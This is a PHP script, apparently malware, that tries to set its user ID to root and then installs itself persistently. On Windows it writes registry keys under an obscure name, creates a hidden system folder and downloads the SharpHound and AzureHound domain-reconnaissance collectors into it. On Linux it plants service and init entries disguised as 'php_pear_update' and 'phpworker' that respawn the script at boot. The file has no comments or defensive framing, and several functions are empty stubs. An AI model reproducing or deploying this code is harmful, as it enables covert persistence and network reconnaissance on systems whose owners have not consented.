<?php
ini_set("safe_mode", "0");
umask(0);
posix_setuid(0);
define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);

function checkfs(){
    if (substr(php_uname(), 0, 7) == 'Windows') {
        $wh = new COM('WScript.Shell');
        if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
            $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 48));
            shell_exec("mkdir " . $t);
            shell_exec("attrib +h +s " . $t);
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
        }else{
            return true;
        }
    } else {
        if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update")){
            $f = fopen("/etc/service/php_pear_update", "w");
            fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
            fflush($f);
            fclose($f);
        }elseif (is_dir("/etc/init/") && !file_exists("/etc/init/phpworker.conf")){
            $ff = fopen("/etc/init/phpworker.conf", "w");
            fwrite($ff, "start on startup\nstop on shutdown\nrespawn\nrespawn limit 20 5\nscript\n\t[\$(exec $(which php) -f ". SELF_SCRIPT . ") = 'ERROR'] && ( stop; exit 1; )");
            fflush($ff);
            fclose($ff);
        }elseif (is_dir("/var/service") && !file_exists("/var/service/php_pear_update/run")){
            $ffe = fopen("/var/service/php_pear_update/run", "w");
            fwrite($ffe, "#!/bin/sh\nexec setuidgid sh -c 'exec $(which php) ". SELF_SCRIPT ."'");
            fflush($ffe);
            fclose($ffe);
        }
        return true;
    }

}

function checkin_timer($time){
    if (is_int($time) && !empty($time) || $time != 0){
        pcntl_fork();
    }

}

function fork_control(){

}

function watcher($lo){

}